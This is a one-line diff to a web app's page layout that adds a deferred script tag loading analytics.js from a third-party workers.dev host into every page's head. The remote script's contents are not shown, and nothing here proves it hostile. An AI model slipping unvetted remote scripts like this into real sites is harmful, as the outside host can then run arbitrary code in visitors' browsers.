@@ -2221,6 +2221,7 @@ function layout(
 </script>
 ${c.env.WEB_AD_HEAD || ""}
 ${gptHead(c)}
+<script src="https://central-analytics-api.prime-2.workers.dev/analytics.js" defer></script>
 </head>
 <body>
 <header class="appbar">
